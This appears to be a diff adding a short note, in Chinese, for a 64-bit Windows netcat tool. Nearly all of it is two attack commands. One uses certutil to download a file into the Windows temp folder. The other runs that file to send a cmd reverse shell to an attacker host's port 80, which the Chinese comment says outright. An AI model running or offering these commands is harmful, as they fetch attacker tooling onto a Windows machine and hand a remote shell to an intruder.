@@ -1,0 +1,6 @@
+一个windows 64位的nc
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+C:\windows\temp\$badfile -e cmd $badip 80
+###
+一个windows 64位的nc，上面的命令是用来弹到攻击机的80端口的
+###
